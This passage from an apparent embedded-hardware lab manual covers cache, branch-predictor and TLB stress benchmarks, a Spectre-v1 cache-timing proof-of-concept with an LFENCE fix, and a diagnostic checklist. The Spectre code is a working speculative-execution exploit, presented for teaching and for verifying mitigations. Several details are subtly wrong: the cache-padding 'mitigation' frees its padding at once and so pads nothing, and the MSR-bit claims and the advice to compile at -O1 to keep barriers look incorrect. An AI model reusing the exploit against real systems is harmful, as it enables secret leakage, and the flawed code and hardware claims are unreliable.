    serial_chain(&result);
    clock_gettime(CLOCK_MONOTONIC, &end);
    uint64_t serial_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                         (end.tv_nsec - start.tv_nsec);
    
    // 4-way parallel measurement
    clock_gettime(CLOCK_MONOTONIC, &start);
    parallel_4way(&result);
    clock_gettime(CLOCK_MONOTONIC, &end);
    uint64_t parallel4_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                            (end.tv_nsec - start.tv_nsec);
    
    // 8-way parallel measurement
    clock_gettime(CLOCK_MONOTONIC, &start);
    parallel_8way(&result);
    clock_gettime(CLOCK_MONOTONIC, &end);
    uint64_t parallel8_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                            (end.tv_nsec - start.tv_nsec);
    
    printf("Serial: %.2f ns/op (IPC=%.2f)\n", 
           (double)serial_ns / ITERATIONS,
           (ITERATIONS * 3.8) / (serial_ns / 1.0));  // Assuming 3.8 GHz
    printf("4-way parallel: %.2f ns/op (IPC=%.2f)\n",
           (double)parallel4_ns / ITERATIONS,
           (ITERATIONS * 3.8) / (parallel4_ns / 1.0));
    printf("8-way parallel: %.2f ns/op (IPC=%.2f)\n",
           (double)parallel8_ns / ITERATIONS,
           (ITERATIONS * 3.8) / (parallel8_ns / 1.0));
    printf("Speedup 4-way: %.2fx\n", (double)serial_ns / parallel4_ns);
    printf("Speedup 8-way: %.2fx\n", (double)serial_ns / parallel8_ns);
    
    return 0;
}
```

Compile and execute with `gcc -O2 -o ilp_test ilp_test.c` and `taskset -c 0 ./ilp_test`. On the i7-10700 (4-wide issue, out-of-order execution), practitioners observe serial execution achieving IPC ≈ 1.0 (one instruction per cycle, limited by the dependency chain), 4-way parallel execution achieving IPC ≈ 3.5 (approaching the 4-wide issue limit), and 8-way parallel execution achieving IPC ≈ 3.8 (saturating the issue width). The speedup from serial to 8-way parallel reaches approximately 3.5×, demonstrating that ILP extraction provides substantial performance gains when dependency chains permit.

Profile the ILP benchmark with `perf stat -e cycles,instructions,uops_issued.any,uops_retired.retire_slots` to observe microarchitectural execution characteristics. The `uops_issued.any` event counts micro-operations dispatched to execution units; dividing by cycles yields average issue width. The `uops_retired.retire_slots` event counts retirement slots consumed; modern x86-64 processors can retire up to 4 micro-ops per cycle. For the 8-way parallel benchmark, practitioners observe approximately 3.8 uops issued per cycle and 3.6 uops retired per cycle, confirming near-saturation of the execution backend.

Synthesize cache and ILP measurements into a comprehensive performance model. For a given code kernel, the effective CPI decomposes into:

$$\text{CPI} = \text{CPI}_{\text{ideal}} + \text{CPI}_{\text{memory}} + \text{CPI}_{\text{branch}} + \text{CPI}_{\text{structural}}$$

where $\text{CPI}_{\text{ideal}}$ represents the baseline cycles per instruction assuming perfect caches, perfect branch prediction, and infinite execution resources (typically 0.25 for simple arithmetic on a 4-wide superscalar processor), $\text{CPI}_{\text{memory}}$ accounts for memory hierarchy stalls ($\text{CPI}_{\text{memory}} = \text{MissRate}_{L1} \cdot L_{L1} + \text{MissRate}_{L2} \cdot L_{L2} + \ldots$), $\text{CPI}_{\text{branch}}$ accounts for branch misprediction penalties, and $\text{CPI}_{\text{structural}}$ accounts for structural hazards (execution unit contention, register file port conflicts). This decomposition guides optimization: reducing $\text{CPI}_{\text{memory}}$ through data layout and prefetching, reducing $\text{CPI}_{\text{branch}}$ through branchless algorithms or profile-guided optimization, and reducing $\text{CPI}_{\text{structural}}$ through instruction scheduling and loop unrolling.

## Exercise 3: Stress Testing, Boundary Failure & Recovery Protocol

The third exercise advances to adversarial microarchitectural stress testing, deliberately constructing pathological workloads that expose cache thrashing, branch predictor saturation, TLB exhaustion, and speculative execution side channels. Practitioners will trigger catastrophic performance collapse conditions, measure the degradation magnitude, implement mitigation techniques, and validate recovery. This capability proves essential for real-time embedded systems, where worst-case execution time (WCET) guarantees require understanding and bounding microarchitectural pathologies that rarely manifest in average-case profiling.

Begin with cache thrashing induction through adversarial memory access patterns. Cache thrashing occurs when a working set size slightly exceeds cache capacity, causing continuous eviction and re-fetch of recently accessed data. For a set-associative cache, thrashing becomes particularly severe when the working set maps to a small number of cache sets, exhausting associativity and triggering conflict misses despite ample total cache capacity. Construct a thrashing benchmark that allocates $N$ arrays each sized to map to the same cache set:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#define CACHE_LINE_SIZE 64
#define L1_SIZE (32 * 1024)    // 32 KB
#define L1_ASSOCIATIVITY 8
#define NUM_SETS (L1_SIZE / (CACHE_LINE_SIZE * L1_ASSOCIATIVITY))  // 64 sets

#define NUM_ARRAYS 16          // Exceeds associativity
#define ARRAY_SIZE (NUM_SETS * CACHE_LINE_SIZE)
#define ITERATIONS 10000000

int main(void) {
    printf("Cache Thrashing Stress Test\n");
    printf("L1 cache: %d KB, %d-way, %d sets\n", 
           L1_SIZE / 1024, L1_ASSOCIATIVITY, NUM_SETS);
    printf("Arrays: %d x %zu bytes (%.1f KB total)\n",
           NUM_ARRAYS, ARRAY_SIZE, (NUM_ARRAYS * ARRAY_SIZE) / 1024.0);
    
    // Allocate arrays aligned to cache set boundaries
    uint8_t **arrays = malloc(NUM_ARRAYS * sizeof(uint8_t*));
    for (int i = 0; i < NUM_ARRAYS; i++) {
        arrays[i] = aligned_alloc(CACHE_LINE_SIZE, ARRAY_SIZE);
        if (!arrays[i]) {
            perror("aligned_alloc");
            return 1;
        }
        memset(arrays[i], i, ARRAY_SIZE);  // Initialize
    }
    
    struct timespec start, end;
    uint64_t sum = 0;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Access arrays in round-robin, forcing cache thrashing
    for (uint64_t iter = 0; iter < ITERATIONS; iter++) {
        for (int arr = 0; arr < NUM_ARRAYS; arr++) {
            sum += arrays[arr][0];  // Access first byte of each array
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    uint64_t total_accesses = ITERATIONS * NUM_ARRAYS;
    double ns_per_access = (double)elapsed_ns / total_accesses;
    
    printf("Total accesses: %lu\n", total_accesses);
    printf("Time per access: %.2f ns\n", ns_per_access);
    printf("Equivalent cycles: %.1f\n", ns_per_access * 3.8);
    printf("Sum (prevent optimization): %lu\n", sum);
    
    for (int i = 0; i < NUM_ARRAYS; i++) {
        free(arrays[i]);
    }
    free(arrays);
    
    return 0;
}
```

The benchmark allocates 16 arrays, each 4 KB (64 sets × 64 bytes per line), aligned to cache line boundaries. Assuming the L1 cache uses the lower address bits for set indexing, all 16 arrays map to the same set pattern. Accessing the first byte of each array in sequence forces 16 concurrent mappings to the same sets, exceeding the 8-way associativity and triggering continuous evictions. Compile and execute with `gcc -O2 -o thrash_test thrash_test.c` and `taskset -c 0 ./thrash_test`.

Profile with `perf stat -e L1-dcache-loads,L1-dcache-load-misses,cycles,instructions`. Practitioners observe L1 miss rates exceeding 90%, with approximately 15-20 cycles per access (compared to 1 cycle for L1 hits), confirming catastrophic thrashing. The total execution time increases by 10-15× compared to a cache-friendly sequential access pattern. This pathological case demonstrates the importance of data layout planning in embedded systems handling multiple concurrent data streams.

Implement a mitigation strategy through array padding to distribute mappings across cache sets. Modify the allocation to insert unused padding between arrays, ensuring each array maps to distinct sets:

```c
#define PADDING_SIZE (L1_SIZE / NUM_ARRAYS)  // Spread across entire cache

for (int i = 0; i < NUM_ARRAYS; i++) {
    arrays[i] = aligned_alloc(CACHE_LINE_SIZE, ARRAY_SIZE);
    // Force distinct cache set mapping by accessing with large stride
    if (i > 0) {
        // Waste address space to offset mapping
        void *dummy = aligned_alloc(CACHE_LINE_SIZE, PADDING_SIZE);
        free(dummy);
    }
}
```

While this approach wastes memory, it eliminates conflict misses. A more practical solution reorganizes data structures to interleave accesses spatially rather than temporally, accessing adjacent elements of a single array rather than corresponding elements of multiple arrays.

Proceed to branch predictor saturation testing. Modern two-level adaptive predictors maintain per-branch pattern history tables (PHT) indexed by branch address XORed with recent outcome history (global history register, GHR). The PHT typically contains 10-14 bits of history (1024-16384 entries), each storing a 2-bit saturating counter predicting taken/not-taken. Pathological branch patterns with long-period sequences exceed the predictor's capacity, causing persistent mispredictions. Construct a benchmark generating a 16-bit pseudo-random sequence as branch outcomes:

```c
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define ITERATIONS 10000000

uint16_t lfsr = 0xACE1;  // Linear feedback shift register seed

uint16_t lfsr_step(void) {
    uint16_t bit = ((lfsr >> 0) ^ (lfsr >> 2) ^ (lfsr >> 3) ^ (lfsr >> 5)) & 1;
    lfsr = (lfsr >> 1) | (bit << 15);
    return lfsr;
}

int main(void) {
    printf("Branch Predictor Saturation Test\n");
    
    struct timespec start, end;
    volatile uint64_t counter = 0;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (uint64_t i = 0; i < ITERATIONS; i++) {
        if (lfsr_step() & 1) {
            counter++;
        } else {
            counter--;
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    double ns_per_branch = (double)elapsed_ns / ITERATIONS;
    
    printf("Time per branch: %.2f ns (%.1f cycles)\n", 
           ns_per_branch, ns_per_branch * 3.8);
    printf("Counter (prevent optimization): %lu\n", counter);
    
    return 0;
}
```

The 16-bit LFSR generates a maximum-length pseudo-random sequence with period $2^{16} - 1 = 65535$, far exceeding typical predictor history depth. Execute with `perf stat -e branches,branch-misses,cycles,instructions taskset -c 0 ./branch_stress`. Practitioners observe approximately 50% misprediction rate (near-random prediction) and 8-10 cycles per iteration, consistent with pipeline flush overhead. Compare this to a predictable pattern (e.g., alternating every 4 iterations) by replacing the LFSR condition with `((i / 4) & 1)`; misprediction rate drops below 5% and execution time halves.

Mitigation strategies for branch-heavy code include profile-guided optimization (PGO) to reorder basic blocks for better prediction, branchless code generation via conditional moves (CMOV on x86-64, CSEL on ARM64), and explicit branch hints (e.g., GCC's `__builtin_expect`). Rewrite the branch-intensive loop using branchless arithmetic:

```c
for (uint64_t i = 0; i < ITERATIONS; i++) {
    uint16_t outcome = lfsr_step() & 1;
    counter += outcome ? 1 : -1;  // Compiler generates CMOV
}
```

Compile with `-O2` and verify assembly with `objdump -d ./branch_stress | grep -A5 'main'`. Modern compilers generate CMOV instructions for simple conditional expressions, eliminating branches entirely. Re-run the benchmark; execution time drops to approximately 1.5 ns per iteration (6 cycles), confirming that branchless code outperforms even perfectly predicted branches due to eliminated branch instruction overhead.

Advance to Translation Lookaside Buffer (TLB) thrashing. The TLB caches virtual-to-physical address translations, avoiding costly page table walks. Modern x86-64 processors provide split L1 TLBs (64-entry instruction TLB, 64-entry data TLB) and a unified L2 TLB (1536 entries on recent Intel cores). Accessing more unique pages than TLB capacity triggers TLB misses, incurring 100+ cycle page table walk penalties. Construct a benchmark allocating a large memory region and accessing scattered pages:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define NUM_PAGES 2048         // Exceeds L2 TLB capacity
#define ITERATIONS 1000000

int main(void) {
    printf("TLB Thrashing Test\n");
    printf("Pages: %d (%.1f MB)\n", NUM_PAGES, 
           (NUM_PAGES * PAGE_SIZE) / (1024.0 * 1024.0));
    
    // Allocate large region
    size_t region_size = NUM_PAGES * PAGE_SIZE;
    uint8_t *region = mmap(NULL, region_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Touch all pages to force physical allocation
    for (int i = 0; i < NUM_PAGES; i++) {
        region[i * PAGE_SIZE] = i;
    }
    
    struct timespec start, end;
    uint64_t sum = 0;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Access one byte per page in scattered order
    for (uint64_t iter = 0; iter < ITERATIONS; iter++) {
        for (int page = 0; page < NUM_PAGES; page++) {
            sum += region[page * PAGE_SIZE];
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    uint64_t elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000ULL +
                          (end.tv_nsec - start.tv_nsec);
    uint64_t total_accesses = ITERATIONS * NUM_PAGES;
    double ns_per_access = (double)elapsed_ns / total_accesses;
    
    printf("Time per access: %.2f ns (%.1f cycles)\n",
           ns_per_access, ns_per_access * 3.8);
    printf("Sum (prevent optimization): %lu\n", sum);
    
    munmap(region, region_size);
    return 0;
}
```

Execute with `perf stat -e dTLB-loads,dTLB-load-misses,page-faults,cycles taskset -c 0 ./tlb_stress`. Practitioners observe dTLB miss rates above 95% when accessing 2048 pages (exceeding the approximately 1536-entry L2 TLB), with access latency reaching 20-30 ns (75-115 cycles) due to page table walk overhead. This compares to sub-1ns latency when the working set fits in TLB capacity (64 pages or less).

Mitigation employs huge pages (2 MB or 1 GB pages on x86-64) to reduce TLB pressure. Modify the allocation to request transparent huge pages:

```c
uint8_t *region = mmap(NULL, region_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
```

If huge pages are available (configure via `sudo sysctl vm.nr_hugepages=1024`), the TLB miss rate drops dramatically; each TLB entry now covers 2 MB rather than 4 KB, reducing effective page count from 2048 to 4. Access latency falls to approximately 2-3 ns, confirming TLB miss elimination.

Conclude with speculative execution side-channel analysis, specifically Spectre variant 1 (bounds check bypass). Modern processors speculatively execute instructions following conditional branches before the branch outcome resolves. If speculation proceeds down an incorrect path accessing secret data, that data transiently enters the cache hierarchy. Although the CPU eventually discards speculative results, cache timing side channels reveal which addresses were accessed. Construct a Spectre-v1 proof-of-concept demonstrating speculative out-of-bounds array access leaking a secret byte:

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64
#define PROBE_ARRAY_SIZE (256 * CACHE_LINE_SIZE)

uint8_t array1[16];
uint8_t array2[PROBE_ARRAY_SIZE];
char secret[] = "SecretData";

void victim_function(size_t x) {
    if (x < sizeof(array1)) {
        // Bounds check to prevent out-of-bounds access
        // Speculative execution may bypass this check
        uint8_t value = array1[x];
        uint8_t dummy = array2[value * CACHE_LINE_SIZE];
    }
}

int main(void) {
    printf("Spectre-v1 Cache Timing Side Channel\n");
    
    // Initialize arrays
    memset(array1, 0, sizeof(array1));
    memset(array2, 0, sizeof(array2));
    
    // Train branch predictor to expect x < sizeof(array1)
    for (int i = 0; i < 10; i++) {
        victim_function(i % sizeof(array1));
    }
    
    // Flush array2 from cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * CACHE_LINE_SIZE]);
    }
    _mm_mfence();
    
    // Speculative out-of-bounds access
    size_t malicious_x = (size_t)(&secret[0] - &array1[0]);
    victim_function(malicious_x);
    
    // Probe array2 cache timing to recover secret byte
    uint64_t min_time = UINT64_MAX;
    uint8_t leaked_byte = 0;
    
    for (int i = 0; i < 256; i++) {
        uint64_t start = __rdtsc();
        uint8_t dummy = array2[i * CACHE_LINE_SIZE];
        uint64_t end = __rdtsc();
        uint64_t cycles = end - start;
        
        if (cycles < min_time && i != 0) {  // Ignore 0 (likely prefetch)
            min_time = cycles;
            leaked_byte = i;
        }
    }
    
    printf("Leaked byte: 0x%02x '%c' (timing: %lu cycles)\n",
           leaked_byte, leaked_byte, min_time);
    printf("Actual secret: 0x%02x '%c'\n", secret[0], secret[0]);
    
    return 0;
}
```

The attack trains the branch predictor to expect in-bounds accesses, flushes the probe array from cache, then calls the victim function with an out-of-bounds index pointing to the secret. Speculation proceeds past the bounds check, loads the secret byte, and uses it to index into the probe array, bringing that cache line into L1. The probe phase measures access latency to all 256 probe array entries; the entry with minimum latency (cache hit) reveals the secret byte value.

Compile with `gcc -O2 -o spectre_v1 spectre_v1.c` and execute with `taskset -c 0 ./spectre_v1`. On vulnerable processors (pre-2019 Intel/AMD CPUs without hardware mitigations), practitioners observe successful secret extraction with cache hit timing around 10-20 cycles versus 100+ cycles for misses. Modern processors with Spectre mitigations (branch predictor invalidation, speculative store bypass disable) prevent this attack, demonstrating timing uniformity across all probe entries.

Mitigation strategies include software barriers (serializing instructions like LFENCE on x86-64 to block speculation), bounds check masking (ANDing the index with a mask derived from the bounds check result to poison speculative loads), and compiler-inserted retpoline sequences for indirect branches. Insert an LFENCE barrier to prevent speculation:

```c
if (x < sizeof(array1)) {
    _mm_lfence();  // Serialize execution, prevent speculation
    uint8_t value = array1[x];
    uint8_t dummy = array2[value * CACHE_LINE_SIZE];
}
```

Re-run the attack; the LFENCE prevents speculative execution from proceeding past the bounds check, eliminating the cache side channel. Verify with timing measurements showing uniform latency across all probe entries.

## Operational Reference Guide & Diagnostic Checklist

This reference section consolidates the experimental procedures, quantitative thresholds, and diagnostic protocols developed across the laboratory exercises, providing a field-deployable handbook for hardware practitioners conducting microarchitectural verification and performance troubleshooting on embedded platforms.

**Baseline Performance Characterization Protocol**: For any new processor or development board, establish baseline metrics by executing the foundational latency benchmarks (integer arithmetic, memory load, branch prediction) from Exercise 1. Record the following reference values: (1) integer addition latency in cycles (expect 1 cycle for modern superscalar processors), (2) L1 cache hit latency in cycles (expect 3-5 cycles), (3) L2 cache hit latency in cycles (expect 10-15 cycles), (4) L3/LLC cache hit latency in cycles (expect 30-50 cycles), (5) DRAM access latency in cycles (expect 100-300 cycles depending on memory technology), (6) branch misprediction penalty in cycles (expect 15-20 cycles), (7) sustained IPC under ideal conditions (expect 2.5-3.5 for quad-issue out-of-order cores). These values form the performance envelope for optimization target-setting; any production workload achieving IPC within 70% of baseline and cache miss rates below 10% meets acceptable efficiency thresholds.

**Cache Hierarchy Verification Procedure**: To validate cache configuration and confirm manufacturer specifications, execute the cache sweep microbenchmark with working set sizes spanning 1 KB to 128 MB in power-of-two increments. Plot access latency versus working set size on a log-log scale. Inflection points in the curve correspond to cache capacity boundaries: the first sharp latency increase marks L1 capacity, the second marks L2 capacity, the third marks L3/LLC capacity, and the final plateau represents DRAM latency. Extract quantitative capacity values by identifying working set sizes where latency exceeds the prior level by 2× or more. For example, if latency jumps from 1.2 ns to 3.5 ns at 32 KB working set, L1 capacity is 32 KB. Cross-reference extracted values against processor datasheets; discrepancies may indicate incorrect cache configuration (disabled cache banks, reduced associativity due to defects) or measurement artifacts (insufficient iteration counts, thermal throttling).

**Branch Prediction Characterization Matrix**: Quantify branch predictor accuracy across pattern types using the branch test harness with configurable outcome sequences. Test these canonical patterns: (1) always taken (100% predictable), (2) alternating every cycle (T-NT-T-NT, worst-case for simple predictors), (3) alternating every N cycles for N = 2, 4, 8, 16 (tests predictor history depth), (4) pseudo-random via LFSR (unbiased 50% taken rate), (5) biased random at 90% taken rate (tests counter saturation thresholds). Record misprediction rate for each pattern. Acceptable performance targets: < 1% mispredictions for always-taken/not-taken patterns, < 10% for alternating-every-4 patterns, < 30% for pseudo-random patterns. If random pattern mispredictions exceed 60%, suspect corrupted or disabled branch predictor state; verify via processor MSR dumps (Intel IA32_MISC_ENABLE register bit 2 enables branch prediction).

**TLB Capacity Stress Test**: Determine practical TLB entry count by executing the TLB thrashing benchmark with increasing page counts while monitoring dTLB miss rate via `perf stat -e dTLB-load-misses,dTLB-loads`. Plot miss rate versus page count. The TLB capacity equals the page count where miss rate transitions from < 5% to >50%. For x86-64 desktop processors, expect approximately 1500-2000 effective entries (combination of L1 and L2 TLB); for ARM Cortex-A cores, expect 32-64 L1 TLB entries and 512-1024 L2 TLB entries. If measured capacity falls significantly below datasheet specifications (e.g., 500 entries when 1536 expected), investigate address space layout: non-contiguous allocations, excessive fragmentation, or kernel page table configuration issues may inflate effective page count.

**Speculative Execution Vulnerability Surface**: For systems handling sensitive data, validate speculative execution mitigations using the Spectre-v1 cache timing proof-of-concept. Successful secret extraction (leaked byte matches actual secret with >90% probability across 100 trials) indicates vulnerable hardware or disabled mitigations. Mitigation verification: (1) confirm IBRS/IBPB/STIBP bits in IA32_ARCH_CAPABILITIES MSR (Intel) or CPUID function 0x80000008 (AMD), (2) verify kernel boot parameters include `spectre_v2=on` and `spec_store_bypass_disable=on` via `cat /proc/cmdline`, (3) check `/sys/devices/system/cpu/vulnerabilities/spectre_v1` reports "Mitigation: usercopy/swapgs barriers and __user pointer sanitization." If mitigations are present but timing attacks succeed, suspect compiler optimization stripping barriers; recompile with `-O1` instead of `-O2` or insert explicit compiler fences (`asm volatile("" ::: "memory")`).

**Performance Counter Event Selection Guide**: For comprehensive workload profiling, configure `perf` to simultaneously capture these event groups: (1) Retirement metrics: `instructions`, `cycles`, `uops_retired.slots` (Intel) or `armv8_pmuv3/inst_retired/` (ARM), (2) Frontend metrics: `idq_uops_not_delivered.core` (Intel frontend stalls), (3) Backend metrics: `cycle_activity.stalls_total` (Intel backend stalls), (4) Memory metrics: `mem_load_retired.l1_miss`, `mem_load_retired.l2_miss`, `mem_load_retired.l3_miss`, (5) Branch metrics: `br_misp_retired.all_branches`, (6) TLB metrics: `dtlb_load_misses.walk_completed`. Configure multi-group collection via `perf stat --group -e '{cycles,instructions},{L1-misses,L2-misses}' ./workload` to capture correlated events. ARM equivalents: use `armv8_pmuv3/l1d_cache_refill/`, `armv8_pmuv3/l2d_cache_refill/`, `armv8_pmuv3/br_mis_pred/`.

**Gem5 Simulation Validation Protocol**: Gem5-generated performance predictions diverge from physical hardware due to imperfect microarchitectural models, particularly for memory controller timing and OS scheduler interactions. Validate gem5 accuracy by simulating a known-good benchmark (e.g., SPEC CPU2017 suite) and comparing simulated cycle counts against hardware measurements. Acceptable divergence: ±20% for CPU-bound workloads, ±40% for memory-bound workloads. Large divergences (>50%) indicate model parameter misconfiguration; verify these settings match target hardware: (1) CPU clock frequency, (2) cache line size (64 bytes for x86-64/ARM64), (3) memory controller timing parameters (tCL, tRCD, tRP from DRAM datasheet), (4) cache associativity and replacement policy (LRU vs pseudo-LRU). For extremely sensitive applications (hard real-time embedded systems), prefer physical hardware measurements over simulation; use gem5 only for early-stage exploration before silicon availability.

**Thermal Throttling Detection**: Prolonged execution of stress tests may trigger thermal throttling, dynamically reducing clock frequency to prevent overheating. Throttling invalidates cycle-count-based performance measurements. Detect throttling via frequency monitoring: execute `watch -n 1 "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"` in a separate terminal during benchmark runs. If frequency drops below the nominal base frequency (e.g., from 3.8 GHz to 2.5 GHz), throttling is active. Mitigation: improve cooling (verify heatsink contact, increase airflow), reduce test iteration counts, or insert 10-second idle periods between runs to allow temperature stabilization. For production systems, thermal throttling indicates inadequate thermal design; redesign enclosure ventilation or uprate heatsink thermal capacity.

**Diagnostic Decision Tree for Performance Anomalies**: When measured performance deviates from expectations, apply this triage sequence: (1) Verify CPU frequency via `cpupower frequency-info`; if below nominal, suspect power management interference or thermal throttling. (2) Profile cache miss rates via `perf stat`; if L1 miss rate exceeds 20%, investigate data layout (cache line alignment, structure padding, false sharing). (3) Profile branch misprediction rate; if exceeding 15%, consider profile-guided optimization or branchless rewrites. (4) Profile TLB miss rate; if exceeding 5%, enable huge pages or refactor memory access patterns for spatial locality. (5) Check IPC; if below 1.0 on a quad-issue core, suspect dependency chain serialization or insufficient instruction-level parallelism; unroll loops or pipeline-parallelize computations. (6) If all metrics appear nominal but performance lags expectations, investigate OS scheduler interference (context switches, timer interrupts); isolate workload to dedicated core via `isolcpus` kernel parameter and disable kernel tick via `nohz_full`.

**Continuous Integration Microarchitecture Regression Testing**: Integrate microarchitectural verification into automated build pipelines by defining performance acceptance thresholds for critical code paths. For each release candidate, execute instrumented microbenchmarks capturing IPC, cache miss rates, and execution latency; flag builds where metrics regress beyond tolerance (e.g., >10% IPC decrease, >50% cache miss rate increase). Automated regression detection prevents architectural performance bugs (unintended algorithm changes, compiler regression) from reaching production. Example Jenkins pipeline stage:

```groovy
stage('Microarchitecture Performance') {
    steps {
        sh 'taskset -c 0 perf stat -x, -o perf.csv -e cycles,instructions,cache-misses,cache-references ./benchmark'
        script {
            def results = readCSV file: 'perf.csv'
            def ipc = results['instructions'] / results['cycles']
            def missRate = results['cache-misses'] / results['cache-references']
            
            if (ipc < 2.0) {
                error("IPC regression: ${ipc} < 2.0")
            }
            if (missRate > 0.15) {
                error("Cache miss rate regression: ${missRate} > 15%")
            }
        }
    }
}
```

This operational reference equips practitioners with concrete protocols for measuring, diagnosing, and optimizing microarchitectural performance across the full spectrum of embedded computing platforms, from resource-constrained IoT microcontrollers to high-performance edge compute accelerators. The methodology scales from initial hardware bring-up through production deployment, providing quantitative evidence for architectural decisions and empirical validation of optimization impact.
